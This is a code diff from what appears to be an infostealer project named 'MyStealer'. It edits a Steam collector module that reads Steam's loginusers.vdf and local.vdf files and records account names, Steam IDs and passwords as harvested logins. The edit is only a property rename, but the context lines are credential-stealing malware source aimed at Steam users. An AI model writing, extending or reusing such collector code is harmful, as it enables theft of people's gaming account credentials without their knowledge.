@@ -15,7 +15,7 @@ namespace MyStealer.Collector.Game
     /// </summary>
     public class Steam : GameCollector
     {
-        public override string ModuleName => "Steam";
+        public override string Name => "Steam";
 
         private static readonly string loginUsersVdfPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Steam", "config", "loginusers.vdf");
         private static readonly string localVdfPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Steam", "local.vdf");
@@ -74,7 +74,7 @@ namespace MyStealer.Collector.Game
                     count++;
                     set.Add(new GameLogin
                     {
-                        ProgramName = ModuleName,
+                        ProgramName = Name,
                         UserName = accName,
                         Id = steamId,
                         Password = password
